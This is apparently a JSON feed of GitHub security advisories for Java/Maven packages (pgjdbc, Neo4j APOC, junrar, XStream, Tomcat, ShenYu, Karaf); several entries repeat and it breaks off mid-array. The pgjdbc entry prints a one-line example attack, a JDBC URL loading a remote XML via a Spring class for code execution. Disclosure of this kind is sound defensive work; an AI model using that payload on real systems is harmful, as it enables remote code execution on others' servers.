{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>pgjdbc instantiates plugin instances based on class names provided via <code>authenticationPluginClassName</code>, <code>sslhostnameverifier</code>, <code>socketFactory</code>, <code>sslfactory</code>, <code>sslpasswordcallback</code> connection properties.</p>\n<p>However, the driver did not verify if the class implements the expected interface before instantiating the class.</p>\n<p>Here's an example attack using an out-of-the-box class from Spring Framework:</p>\n<pre><code>DriverManager.getConnection(\"jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://target/exp.xml\");\n</code></pre>\n<p>The first impacted version is REL9.4.1208 (it introduced <code>socketFactory</code> connection property)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4\">https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4</a></li>\n<li><a href=\"https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813\">https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v7wg-cpwc-24m4\">https://github.com/advisories/GHSA-v7wg-cpwc-24m4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v7wg-cpwc-24m4",
            "title": "[org.postgresql:postgresql] Remote code execution vulnerability using plugin features ",
            "date_modified": "2022-02-02T07:14:00.000Z",
            "date_published": "2022-02-02T00:04:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v7wg-cpwc-24m4"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>pgjdbc instantiates plugin instances based on class names provided via <code>authenticationPluginClassName</code>, <code>sslhostnameverifier</code>, <code>socketFactory</code>, <code>sslfactory</code>, <code>sslpasswordcallback</code> connection properties.</p>\n<p>However, the driver did not verify if the class implements the expected interface before instantiating the class.</p>\n<p>Here's an example attack using an out-of-the-box class from Spring Framework:</p>\n<pre><code>DriverManager.getConnection(\"jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://target/exp.xml\");\n</code></pre>\n<p>The first impacted version is REL9.4.1208 (it introduced <code>socketFactory</code> connection property)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4\">https://github.com/pgjdbc/pgjdbc/security/advisories/GHSA-v7wg-cpwc-24m4</a></li>\n<li><a href=\"https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813\">https://github.com/pgjdbc/pgjdbc/commit/f4d0ed69c0b3aae8531d83d6af4c57f22312c813</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v7wg-cpwc-24m4\">https://github.com/advisories/GHSA-v7wg-cpwc-24m4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v7wg-cpwc-24m4",
            "title": "[org.postgresql:postgresql] Remote code execution vulnerability using plugin features ",
            "date_modified": "2022-02-02T07:14:00.000Z",
            "date_published": "2022-02-02T00:04:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v7wg-cpwc-24m4"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directory Traversal Vulnerabilities found in several functions of apoc plugins in Neo4j Graph database. The attacker can retrieve and download files from outside the configured directory on the affected server. Under some circumstances, the attacker can also create files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The users should aim to use the latest released version compatible with their Neo4j version. The minimum versions containing patch for this vulnerability (for Neo4j 4.2, 4.3, and 4.4 bundled with APOC, upgrade to the appropriate patched version):\n3.5 - bundle n/a, standalone 3.5.0.17\n4.2 - bundle 4.2.13, standalone 4.2.10\n4.3 - bundle 4.3.9, standalone 4.3.0.4\n4.4 - bundle 4.4.2, standalone 4.4.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade the library, you can control the <a href=\"https://neo4j.com/docs/operations-manual/current/reference/configuration-settings/#config_dbms.security.procedures.allowlist\">allowlist of the functions</a> that can be used in your system:</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures\">neo4j-apoc-procedures</a></li>\n<li>Email us at <a href=\"mailto:security@neo4j.com\">security@neo4j.com</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/advisories/GHSA-4mpj-488r-vh6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m",
            "title": "[org.neo4j.procedure:apoc] Path traversal in Neo4j Graph Database",
            "date_modified": "2022-02-01T22:01:14.000Z",
            "date_published": "2022-02-01T22:01:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directory Traversal Vulnerabilities found in several functions of apoc plugins in Neo4j Graph database. The attacker can retrieve and download files from outside the configured directory on the affected server. Under some circumstances, the attacker can also create files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The users should aim to use the latest released version compatible with their Neo4j version. The minimum versions containing patch for this vulnerability (for Neo4j 4.2, 4.3, and 4.4 bundled with APOC, upgrade to the appropriate patched version):\n3.5 - bundle n/a, standalone 3.5.0.17\n4.2 - bundle 4.2.13, standalone 4.2.10\n4.3 - bundle 4.3.9, standalone 4.3.0.4\n4.4 - bundle 4.4.2, standalone 4.4.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade the library, you can control the <a href=\"https://neo4j.com/docs/operations-manual/current/reference/configuration-settings/#config_dbms.security.procedures.allowlist\">allowlist of the functions</a> that can be used in your system:</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures\">neo4j-apoc-procedures</a></li>\n<li>Email us at <a href=\"mailto:security@neo4j.com\">security@neo4j.com</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/advisories/GHSA-4mpj-488r-vh6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m",
            "title": "[org.neo4j.procedure:apoc] Path traversal in Neo4j Graph Database",
            "date_modified": "2022-02-01T22:01:14.000Z",
            "date_published": "2022-02-01T22:01:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directory Traversal Vulnerabilities found in several functions of apoc plugins in Neo4j Graph database. The attacker can retrieve and download files from outside the configured directory on the affected server. Under some circumstances, the attacker can also create files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The users should aim to use the latest released version compatible with their Neo4j version. The minimum versions containing patch for this vulnerability (for Neo4j 4.2, 4.3, and 4.4 bundled with APOC, upgrade to the appropriate patched version):\n3.5 - bundle n/a, standalone 3.5.0.17\n4.2 - bundle 4.2.13, standalone 4.2.10\n4.3 - bundle 4.3.9, standalone 4.3.0.4\n4.4 - bundle 4.4.2, standalone 4.4.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade the library, you can control the <a href=\"https://neo4j.com/docs/operations-manual/current/reference/configuration-settings/#config_dbms.security.procedures.allowlist\">allowlist of the functions</a> that can be used in your system:</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures\">neo4j-apoc-procedures</a></li>\n<li>Email us at <a href=\"mailto:security@neo4j.com\">security@neo4j.com</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/advisories/GHSA-4mpj-488r-vh6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m",
            "title": "[org.neo4j.procedure:apoc] Path traversal in Neo4j Graph Database",
            "date_modified": "2022-02-01T22:01:14.000Z",
            "date_published": "2022-02-01T22:01:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Directory Traversal Vulnerabilities found in several functions of apoc plugins in Neo4j Graph database. The attacker can retrieve and download files from outside the configured directory on the affected server. Under some circumstances, the attacker can also create files.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The users should aim to use the latest released version compatible with their Neo4j version. The minimum versions containing patch for this vulnerability (for Neo4j 4.2, 4.3, and 4.4 bundled with APOC, upgrade to the appropriate patched version):\n3.5 - bundle n/a, standalone 3.5.0.17\n4.2 - bundle 4.2.13, standalone 4.2.10\n4.3 - bundle 4.3.9, standalone 4.3.0.4\n4.4 - bundle 4.4.2, standalone 4.4.0.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade the library, you can control the <a href=\"https://neo4j.com/docs/operations-manual/current/reference/configuration-settings/#config_dbms.security.procedures.allowlist\">allowlist of the functions</a> that can be used in your system:</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures\">neo4j-apoc-procedures</a></li>\n<li>Email us at <a href=\"mailto:security@neo4j.com\">security@neo4j.com</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/neo4j-contrib/neo4j-apoc-procedures/security/advisories/GHSA-4mpj-488r-vh6m</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4mpj-488r-vh6m\">https://github.com/advisories/GHSA-4mpj-488r-vh6m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m",
            "title": "[org.neo4j.procedure:apoc] Path traversal in Neo4j Graph Database",
            "date_modified": "2022-02-01T22:01:14.000Z",
            "date_published": "2022-02-01T22:01:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4mpj-488r-vh6m"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A carefully crafted RAR archive can trigger an infinite loop while extracting said archive. The impact depends solely on how the application uses the library, and whether files can be provided by malignant users. </p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem is patched in 7.4.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>None</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/junrar/junrar/issues/73\">https://github.com/junrar/junrar/issues/73</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/junrar/junrar/security/advisories/GHSA-m6cj-93v6-cvr5\">https://github.com/junrar/junrar/security/advisories/GHSA-m6cj-93v6-cvr5</a></li>\n<li><a href=\"https://github.com/junrar/junrar/issues/73\">https://github.com/junrar/junrar/issues/73</a></li>\n<li><a href=\"https://github.com/junrar/junrar/commit/7b16b3d90b91445fd6af0adfed22c07413d4fab7\">https://github.com/junrar/junrar/commit/7b16b3d90b91445fd6af0adfed22c07413d4fab7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23596\">https://nvd.nist.gov/vuln/detail/CVE-2022-23596</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m6cj-93v6-cvr5\">https://github.com/advisories/GHSA-m6cj-93v6-cvr5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m6cj-93v6-cvr5",
            "title": "[com.github.junrar:junrar] Infinite loop in junrar",
            "date_modified": "2022-02-02T16:03:31.000Z",
            "date_published": "2022-02-01T00:47:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m6cj-93v6-cvr5"
            }
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability may allow a remote attacker to allocate 100% CPU time on the target system depending on CPU type or parallel execution of such a payload resulting in a denial of service only by manipulating the processed input stream.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>XStream 1.4.19 monitors and accumulates the time it takes to add elements to collections and throws an exception if a set threshold is exceeded.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The attack uses the hash code implementation for collections and maps to force an exponential calculation time due to highly recursive structures with in the collection or map. Following types of the Java runtime are affected in Java versions available in December 2021:</p>\n<ul>\n<li>java.util.HashMap</li>\n<li>java.util.HashSet</li>\n<li>java.util.Hashtable</li>\n<li>java.util.LinkedHashMap</li>\n<li>java.util.LinkedHashSet</li>\n<li>java.util.Stack (older Java revisions only)</li>\n<li>java.util.Vector (older Java revisions only)</li>\n<li>Other third party collection implementations that use their element's hash code may also be affected</li>\n</ul>\n<p>If your object graph does not use referenced elements at all, you may simply set the NO_REFERENCE mode:</p>\n<pre><code class=\"language-Java\">XStream xstream = new XStream();\nxstream.setMode(XStream.NO_REFERENCES);\n</code></pre>\n<p>If your object graph contains neither a Hashtable, HashMap nor a HashSet (or one of the linked variants of it) then you can use the security framework to deny the usage of these types:</p>\n<pre><code class=\"language-Java\">XStream xstream = new XStream();\nxstream.denyTypes(new Class[]{\n java.util.HashMap.class, java.util.HashSet.class, java.util.Hashtable.class, java.util.LinkedHashMap.class, java.util.LinkedHashSet.class\n});\n</code></pre>\n<p>Unfortunately these types are very common. If you only use HashMap or HashSet and your XML refers these only as default map or set, you may additionally change the default implementation of java.util.Map and java.util.Set at unmarshalling time::</p>\n<pre><code class=\"language-Java\">xstream.addDefaultImplementation(java.util.TreeMap.class, java.util.Map.class);\nxstream.addDefaultImplementation(java.util.TreeSet.class, java.util.Set.class);\n</code></pre>\n<p>However, this implies that your application does not care about the implementation of the map and all elements are comparable.</p>\n<h3 id=\"references\">References</h3>\n<p>See full information about the nature of the vulnerability and the steps to reproduce it in XStream's documentation for <a href=\"https://x-stream.github.io/CVE-2021-43859.html\">CVE-2021-43859</a>.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The vulnerability was discovered and reported by r00t4dm at Cloud-Penetrating Arrow Lab.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://github.com/x-stream/xstream/issues\">XStream</a></li>\n<li>Contact us at <a href=\"https://groups.google.com/group/xstream-user\">XStream Google Group</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/x-stream/xstream/security/advisories/GHSA-rmr5-cpv2-vgjf\">https://github.com/x-stream/xstream/security/advisories/GHSA-rmr5-cpv2-vgjf</a></li>\n<li><a href=\"https://github.com/x-stream/xstream/commit/e8e88621ba1c85ac3b8620337dd672e0c0c3a846\">https://github.com/x-stream/xstream/commit/e8e88621ba1c85ac3b8620337dd672e0c0c3a846</a></li>\n<li><a href=\"https://x-stream.github.io/CVE-2021-43859.html\">https://x-stream.github.io/CVE-2021-43859.html</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-43859\">https://nvd.nist.gov/vuln/detail/CVE-2021-43859</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rmr5-cpv2-vgjf\">https://github.com/advisories/GHSA-rmr5-cpv2-vgjf</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rmr5-cpv2-vgjf",
            "title": "[com.thoughtworks.xstream:xstream] Denial of Service by injecting highly recursive collections or maps in XStream",
            "date_modified": "2022-02-02T16:03:11.000Z",
            "date_published": "2022-02-01T00:48:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rmr5-cpv2-vgjf"
            }
        },
        {
            "content_html": "<p>The fix for bug CVE-2020-9484 introduced a time of check, time of use vulnerability into Apache Tomcat 10.1.0-M1 to 10.1.0-M8, 10.0.0-M5 to 10.0.14, 9.0.35 to 9.0.56 and 8.5.55 to 8.5.73 that allowed a local attacker to perform actions with the privileges of the user that the Tomcat process is using. This issue is only exploitable when Tomcat is configured to persist sessions using the FileStore.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23181\">https://nvd.nist.gov/vuln/detail/CVE-2022-23181</a></li>\n<li><a href=\"https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9\">https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9f3j-pm6f-9fm5\">https://github.com/advisories/GHSA-9f3j-pm6f-9fm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5",
            "title": "[org.apache.tomcat:tomcat] Race condition in Apache Tomcat",
            "date_modified": "2022-02-01T00:45:44.000Z",
            "date_published": "2022-02-01T00:45:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5"
            }
        },
        {
            "content_html": "<p>The fix for bug CVE-2020-9484 introduced a time of check, time of use vulnerability into Apache Tomcat 10.1.0-M1 to 10.1.0-M8, 10.0.0-M5 to 10.0.14, 9.0.35 to 9.0.56 and 8.5.55 to 8.5.73 that allowed a local attacker to perform actions with the privileges of the user that the Tomcat process is using. This issue is only exploitable when Tomcat is configured to persist sessions using the FileStore.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23181\">https://nvd.nist.gov/vuln/detail/CVE-2022-23181</a></li>\n<li><a href=\"https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9\">https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9f3j-pm6f-9fm5\">https://github.com/advisories/GHSA-9f3j-pm6f-9fm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5",
            "title": "[org.apache.tomcat:tomcat] Race condition in Apache Tomcat",
            "date_modified": "2022-02-01T00:45:44.000Z",
            "date_published": "2022-02-01T00:45:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5"
            }
        },
        {
            "content_html": "<p>The fix for bug CVE-2020-9484 introduced a time of check, time of use vulnerability into Apache Tomcat 10.1.0-M1 to 10.1.0-M8, 10.0.0-M5 to 10.0.14, 9.0.35 to 9.0.56 and 8.5.55 to 8.5.73 that allowed a local attacker to perform actions with the privileges of the user that the Tomcat process is using. This issue is only exploitable when Tomcat is configured to persist sessions using the FileStore.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23181\">https://nvd.nist.gov/vuln/detail/CVE-2022-23181</a></li>\n<li><a href=\"https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9\">https://lists.apache.org/thread/l8x62p3k19yfcb208jo4zrb83k5mfwg9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9f3j-pm6f-9fm5\">https://github.com/advisories/GHSA-9f3j-pm6f-9fm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5",
            "title": "[org.apache.tomcat:tomcat] Race condition in Apache Tomcat",
            "date_modified": "2022-02-01T00:45:44.000Z",
            "date_published": "2022-02-01T00:45:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9f3j-pm6f-9fm5"
            }
        },
        {
            "content_html": "<p>Groovy Code Injection &amp; SpEL Injection which lead to Remote Code Execution. This issue affected Apache ShenYu 2.4.0 and 2.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-45029\">https://nvd.nist.gov/vuln/detail/CVE-2021-45029</a></li>\n<li><a href=\"https://lists.apache.org/thread/3zzmwvg3012tg306x8o893fvdcssx639\">https://lists.apache.org/thread/3zzmwvg3012tg306x8o893fvdcssx639</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/8\">http://www.openwall.com/lists/oss-security/2022/01/25/8</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/26/1\">http://www.openwall.com/lists/oss-security/2022/01/26/1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-gh38-x2wm-xmc8\">https://github.com/advisories/GHSA-gh38-x2wm-xmc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-gh38-x2wm-xmc8",
            "title": "[org.apache.shenyu:shenyu-common] Code injection in ShenYu",
            "date_modified": "2022-01-31T21:45:31.000Z",
            "date_published": "2022-01-28T22:13:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-gh38-x2wm-xmc8"
            }
        },
        {
            "content_html": "<p>User can access /plugin api without authentication. This issue affected Apache ShenYu 2.4.0 and 2.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23944\">https://nvd.nist.gov/vuln/detail/CVE-2022-23944</a></li>\n<li><a href=\"https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y\">https://lists.apache.org/thread/dbrjnnlrf80dr0f92k5r2ysfvf1kr67y</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/5\">http://www.openwall.com/lists/oss-security/2022/01/25/5</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/15\">http://www.openwall.com/lists/oss-security/2022/01/25/15</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/26/2\">http://www.openwall.com/lists/oss-security/2022/01/26/2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6v39-p2xq-g5c3\">https://github.com/advisories/GHSA-6v39-p2xq-g5c3</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6v39-p2xq-g5c3",
            "title": "[org.apache.shenyu:shenyu-common] Missing authentication in ShenYu",
            "date_modified": "2022-02-02T16:16:06.000Z",
            "date_published": "2022-01-28T22:13:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6v39-p2xq-g5c3"
            }
        },
        {
            "content_html": "<p>Missing authentication on ShenYu Admin when register by HTTP. This issue affected Apache ShenYu 2.4.0 and 2.4.1.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23945\">https://nvd.nist.gov/vuln/detail/CVE-2022-23945</a></li>\n<li><a href=\"https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s\">https://lists.apache.org/thread/q2gg6ny6lpkph7nkrvjzqdvqpm805v8s</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/25/6\">http://www.openwall.com/lists/oss-security/2022/01/25/6</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2022/01/26/3\">http://www.openwall.com/lists/oss-security/2022/01/26/3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7rjp-fgwj-47rw\">https://github.com/advisories/GHSA-7rjp-fgwj-47rw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7rjp-fgwj-47rw",
            "title": "[org.apache.shenyu:shenyu-common] Missing authentication in ShenYu",
            "date_modified": "2022-02-02T16:17:08.000Z",
            "date_published": "2022-01-28T22:14:11.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7rjp-fgwj-47rw"
            }
        },
        {
            "content_html": "<p>Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial path traversal which allows to break out of expected folder. The risk is low as obr:* commands are not very used and the entry is set by user. This has been fixed in revision: <a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4</a> <a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf</a> Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6 or later as soon as possible, or use correct path. JIRA Tickets: <a href=\"https://issues.apache.org/jira/browse/KARAF-7326\">https://issues.apache.org/jira/browse/KARAF-7326</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-22932\">https://nvd.nist.gov/vuln/detail/CVE-2022-22932</a></li>\n<li><a href=\"https://karaf.apache.org/security/cve-2022-22932.txt\">https://karaf.apache.org/security/cve-2022-22932.txt</a></li>\n<li><a href=\"https://github.com/apache/karaf/pull/1485\">https://github.com/apache/karaf/pull/1485</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/KARAF-7326\">https://issues.apache.org/jira/browse/KARAF-7326</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-544x-2jx9-4pfg\">https://github.com/advisories/GHSA-544x-2jx9-4pfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-544x-2jx9-4pfg",
            "title": "[org.apache.karaf:apache-karaf] Path traversal in Apache Karaf",
            "date_modified": "2022-01-28T22:25:03.000Z",
            "date_published": "2022-01-28T22:25:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-544x-2jx9-4pfg"
            }
        },
        {
            "content_html": "<p>Apache Karaf obr:* commands and run goal on the karaf-maven-plugin have partial path traversal which allows to break out of expected folder. The risk is low as obr:* commands are not very used and the entry is set by user. This has been fixed in revision: <a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4</a> <a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf</a> Mitigation: Apache Karaf users should upgrade to 4.2.15 or 4.3.6 or later as soon as possible, or use correct path. JIRA Tickets: <a href=\"https://issues.apache.org/jira/browse/KARAF-7326\">https://issues.apache.org/jira/browse/KARAF-7326</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-22932\">https://nvd.nist.gov/vuln/detail/CVE-2022-22932</a></li>\n<li><a href=\"https://karaf.apache.org/security/cve-2022-22932.txt\">https://karaf.apache.org/security/cve-2022-22932.txt</a></li>\n<li><a href=\"https://github.com/apache/karaf/pull/1485\">https://github.com/apache/karaf/pull/1485</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=36a2bc4</a></li>\n<li><a href=\"https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf\">https://gitbox.apache.org/repos/asf?p=karaf.git;h=52b70cf</a></li>\n<li><a href=\"https://issues.apache.org/jira/browse/KARAF-7326\">https://issues.apache.org/jira/browse/KARAF-7326</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-544x-2jx9-4pfg\">https://github.com/advisories/GHSA-544x-2jx9-4pfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-544x-2jx9-4pfg",
            "title": "[org.apache.karaf:apache-karaf] Path traversal in Apache Karaf",
            "date_modified": "2022-01-28T22:25:03.000Z",
            "date_published": "2022-01-28T22:25:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-544x-2jx9-4pfg"
            }
        },
        {
